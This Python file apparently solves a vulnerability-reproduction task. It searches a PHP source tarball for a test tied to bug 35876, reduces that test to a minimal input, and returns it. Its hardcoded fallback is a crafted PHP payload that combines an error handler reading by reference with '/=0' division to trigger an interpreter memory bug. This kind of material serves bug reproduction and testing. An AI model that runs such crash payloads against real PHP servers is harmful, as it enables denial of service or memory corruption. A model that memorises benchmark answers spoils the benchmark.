import os
import re
import tarfile
from typing import Optional, Tuple


def _is_ident_char(ch: str) -> bool:
    if not ch:
        return False
    o = ord(ch)
    if 48 <= o <= 57 or 65 <= o <= 90 or 97 <= o <= 122:
        return True
    return ch in "_$" or o >= 128


def _minify_php(code: str) -> str:
    s = code.replace("\r\n", "\n").replace("\r", "\n").strip()

    s = re.sub(r"^\s*<\?(php)?\s*", "", s, flags=re.IGNORECASE)
    s = re.sub(r"\?>\s*$", "", s, flags=re.IGNORECASE)

    out = []
    i = 0
    n = len(s)
    in_sq = False
    in_dq = False
    pending_space = False

    while i < n:
        ch = s[i]

        if in_sq:
            out.append(ch)
            if ch == "\\" and i + 1 < n:
                out.append(s[i + 1])
                i += 2
                continue
            if ch == "'":
                in_sq = False
            i += 1
            continue

        if in_dq:
            out.append(ch)
            if ch == "\\" and i + 1 < n:
                out.append(s[i + 1])
                i += 2
                continue
            if ch == '"':
                in_dq = False
            i += 1
            continue

        if ch == "/" and i + 1 < n and s[i + 1] == "/":
            i += 2
            while i < n and s[i] != "\n":
                i += 1
            pending_space = True
            continue

        if ch == "#":
            i += 1
            while i < n and s[i] != "\n":
                i += 1
            pending_space = True
            continue

        if ch == "/" and i + 1 < n and s[i + 1] == "*":
            i += 2
            while i + 1 < n and not (s[i] == "*" and s[i + 1] == "/"):
                i += 1
            i = min(n, i + 2)
            pending_space = True
            continue

        if ch.isspace():
            pending_space = True
            i += 1
            continue

        if pending_space:
            if out and _is_ident_char(out[-1]) and _is_ident_char(ch):
                out.append(" ")
            pending_space = False

        if ch == "'":
            in_sq = True
        elif ch == '"':
            in_dq = True

        out.append(ch)
        i += 1

    return "".join(out).strip()


def _extract_phpt_section(phpt_text: str, section: str = "FILE") -> Optional[str]:
    s = phpt_text.replace("\r\n", "\n").replace("\r", "\n")
    marker = f"--{section}--"
    i = s.find(marker)
    if i < 0:
        return None
    i = s.find("\n", i)
    if i < 0:
        return ""
    i += 1
    j = s.find("\n--", i)
    if j < 0:
        return s[i:]
    return s[i:j]


def _read_tar_member_text(tf: tarfile.TarFile, m: tarfile.TarInfo, max_bytes: int = 512_000) -> Optional[str]:
    if not m.isfile() or m.size <= 0 or m.size > max_bytes:
        return None
    f = tf.extractfile(m)
    if f is None:
        return None
    b = f.read()
    try:
        return b.decode("utf-8", "ignore")
    except Exception:
        return b.decode("latin-1", "ignore")


def _detect_php_input_mode(tf: tarfile.TarFile) -> str:
    # Returns: "eval" or "file"
    # Heuristic based on fuzz harness presence.
    mode = None
    for m in tf.getmembers():
        if not m.isfile() or m.size <= 0 or m.size > 400_000:
            continue
        name = m.name.lower()
        if "fuzz" not in name and "harness" not in name:
            continue
        if not (name.endswith(".c") or name.endswith(".cc") or name.endswith(".cpp")):
            continue
        txt = _read_tar_member_text(tf, m, max_bytes=400_000)
        if not txt:
            continue
        t = txt
        if "zend_eval_stringl" in t or "zend_eval_string" in t or "zend_compile_string" in t:
            mode = "eval"
            break
        if "php_execute_script" in t or "zend_execute_scripts" in t:
            mode = "file"
    if mode:
        return mode

    # If there is sapi/fuzzer, default to eval.
    for m in tf.getmembers():
        if "sapi/fuzzer" in m.name.replace("\\", "/").lower():
            return "eval"

    # Default to file (CLI-style).
    return "file"


def _is_php_project(tf: tarfile.TarFile) -> bool:
    for m in tf.getmembers():
        n = m.name.replace("\\", "/")
        nl = n.lower()
        if "/zend/" in nl or nl.endswith("/zend_execute.c") or "zend_execute.c" in nl:
            return True
        if "/main/php" in nl or "/sapi/" in nl or "/ext/" in nl:
            return True
    return False


def _find_bug_test_payload(tf: tarfile.TarFile, bug_id: str) -> Optional[str]:
    bug_lower = bug_id.lower()
    best = None  # (len, code)
    for m in tf.getmembers():
        if not m.isfile() or m.size <= 0 or m.size > 300_000:
            continue
        name = m.name.lower()
        if bug_lower not in name:
            continue
        if not (name.endswith(".phpt") or name.endswith(".php") or name.endswith(".inc") or name.endswith(".txt")):
            continue
        txt = _read_tar_member_text(tf, m, max_bytes=300_000)
        if not txt:
            continue
        code = None
        if name.endswith(".phpt"):
            code = _extract_phpt_section(txt, "FILE")
        else:
            code = txt
        if not code:
            continue
        code_m = _minify_php(code)
        if "/=0" not in code_m.replace(" ", "") and "/= 0" not in code_m:
            # still allow if it looks related
            if "assign_div" not in txt.lower() and "division by zero" not in txt.lower():
                continue
        if best is None or len(code_m) < best[0]:
            best = (len(code_m), code_m)
    return best[1] if best else None


def _find_generic_phpt_payload(tf: tarfile.TarFile) -> Optional[str]:
    # Search for a test mentioning assign div or division by zero and "/=".
    best = None
    for m in tf.getmembers():
        if not m.isfile() or m.size <= 0 or m.size > 220_000:
            continue
        name = m.name.lower()
        if not name.endswith(".phpt"):
            continue
        if "/tests/" not in name and "/zend/tests/" not in name and "/zend/" not in name:
            continue
        txt = _read_tar_member_text(tf, m, max_bytes=220_000)
        if not txt:
            continue
        tl = txt.lower()
        if "/=" not in txt:
            continue
        if "division by zero" not in tl and "divide by zero" not in tl and "assign_div" not in tl:
            continue
        code = _extract_phpt_section(txt, "FILE")
        if not code:
            continue
        code_m = _minify_php(code)
        if best is None or len(code_m) < best[0]:
            best = (len(code_m), code_m)
    return best[1] if best else None


class Solution:
    def solve(self, src_path: str) -> bytes:
        bug_id = "35876"
        payload = None
        php_mode = "file"

        try:
            with tarfile.open(src_path, "r:*") as tf:
                if _is_php_project(tf):
                    php_mode = _detect_php_input_mode(tf)
                    payload = _find_bug_test_payload(tf, bug_id)
                    if payload is None:
                        payload = _find_generic_phpt_payload(tf)
        except Exception:
            payload = None
            php_mode = "file"

        if not payload:
            # Fallback crafted PHP payload:
            # Create a non-interned numeric string, set an error handler that reads it by reference,
            # then trigger compound division by zero.
            payload = "$a='1';$a.=$a;set_error_handler(function()use(&$a){echo$a;});$a/=0;"

        payload = _minify_php(payload)

        if php_mode == "file":
            payload = "<?php" + payload

        return payload.encode("utf-8")